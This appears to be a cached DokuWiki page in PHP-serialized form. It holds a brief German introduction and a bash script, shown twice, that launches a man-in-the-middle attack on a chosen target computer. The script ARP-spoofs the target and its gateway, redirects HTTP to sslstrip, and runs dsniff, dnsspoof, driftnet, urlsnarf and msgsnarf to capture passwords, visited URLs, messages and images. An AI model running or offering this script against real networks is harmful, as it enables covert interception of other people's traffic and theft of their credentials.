a:9:{i:0;a:3:{i:0;s:14:"document_start";i:1;a:0:{}i:2;i:0;}i:1;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:0;}i:2;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:56:"kleines Bashskript zum starten von sniffing mit dsniff. ";}i:2;i:1;}i:3;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:57;}i:4;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:57;}i:5;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;s:4:"bash";i:2;s:0:"";i:3;s:717:"
#!/bin/bash
#this Skript use dsniff,arpspoff, driftnet, ssldump

terminal="gnome-terminal -e "
read -p "What is your current interface: " int
read -p "What is your target computer ip addresse: " yip
read -p "What is your target gateway ip addresse: " gip

#Allow IP Forwarding 
echo 1 > /proc/sys/net/ipv4/ip_forward
#Port 80 Redirect to Port 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
#Start sniffing with arpsniff
$terminal "sslstrip -l 10000 -w sslstrip.log" & 
$terminal "arpspoof -i $int -t $yip $gip" &
$terminal "dsniff -i $int -w dsniff.log " & 
$terminal "dnsspoof -i $int"
driftnet -i $int &
$terminal "urlsnarf -i $int" & 
$terminal "msgsnarf -i $int" &
";}i:2;i:3;i:3;s:723:" bash>
#!/bin/bash
#this Skript use dsniff,arpspoff, driftnet, ssldump

terminal="gnome-terminal -e "
read -p "What is your current interface: " int
read -p "What is your target computer ip addresse: " yip
read -p "What is your target gateway ip addresse: " gip

#Allow IP Forwarding 
echo 1 > /proc/sys/net/ipv4/ip_forward
#Port 80 Redirect to Port 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
#Start sniffing with arpsniff
$terminal "sslstrip -l 10000 -w sslstrip.log" & 
$terminal "arpspoof -i $int -t $yip $gip" &
$terminal "dsniff -i $int -w dsniff.log " & 
$terminal "dnsspoof -i $int"
driftnet -i $int &
$terminal "urlsnarf -i $int" & 
$terminal "msgsnarf -i $int" &
";}i:2;i:64;}i:6;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:0:"";}i:2;i:794;}i:7;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:794;}i:8;a:3:{i:0;s:12:"document_end";i:1;a:0:{}i:2;i:794;}}